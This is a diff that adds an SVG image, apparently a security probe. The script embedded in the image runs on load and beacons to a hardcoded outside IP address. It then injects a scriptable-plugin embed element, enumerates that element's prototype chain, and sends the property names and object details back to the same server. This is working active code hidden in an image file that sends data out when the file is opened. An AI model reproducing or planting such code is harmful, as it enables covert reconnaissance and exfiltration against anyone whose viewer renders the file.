@@ -1,0 +1,53 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" version="1.2" baseProfile="tiny"
+     width="1280" height="720" viewBox="0 0 1280 720">
+  <rect width="1280" height="720" fill="#07111f"/>
+  <text x="640" y="120" fill="#49e3a4" font-family="sans-serif"
+        font-size="42" text-anchor="middle">APP-NATIVE-018E</text>
+  <text id="status" x="640" y="200" fill="#ffd166" font-family="sans-serif"
+        font-size="26" text-anchor="middle">Control callback starting...</text>
+  <script type="text/ecmascript"><![CDATA[
+  var base = "http://191.32.31.251/app-native-018/report?";
+  function report(key, value) {
+    try {
+      getURL(base + "key=" + encodeURIComponent(key) +
+        "&value=" + encodeURIComponent(String(value)), function(){});
+    } catch (error) {}
+  }
+  function names(value) {
+    var output = [], key;
+    try {
+      if (Object.getOwnPropertyNames) { return Object.getOwnPropertyNames(value); }
+    } catch (error) {}
+    try { for (key in value) { output[output.length] = key; } } catch (error2) {}
+    return output;
+  }
+  function runEmbed() {
+    var element, current, level = 0;
+    report("embed.start", "true");
+    try {
+      element = document.createElementNS("http://www.w3.org/1999/xhtml", "embed");
+      element.setAttribute("type", "application/mozilla-npruntime-scriptable-plugin");
+      document.documentElement.appendChild(element);
+      report("embed.appended", "true");
+      report("embed.typeof", typeof element);
+      report("embed.string", String(element));
+      current = element;
+      while (current && level < 5) {
+        report("embed.level" + level, names(current).slice(0, 180).join("|"));
+        current = Object.getPrototypeOf ? Object.getPrototypeOf(current) : null;
+        level += 1;
+      }
+      try { report("embed.object", typeof element.object + ":" + String(element.object)); }
+      catch (objectError) { report("embed.object.error", objectError); }
+      document.getElementById("status").firstChild.data = "Embed reflection complete";
+      report("embed.complete", "true");
+    } catch (error) {
+      report("embed.error", error);
+      document.getElementById("status").firstChild.data = "Embed error: " + error;
+    }
+  }
+  report("control.loaded", "true");
+  window.setTimeout(runEmbed, 500);
+  ]]></script>
+</svg>
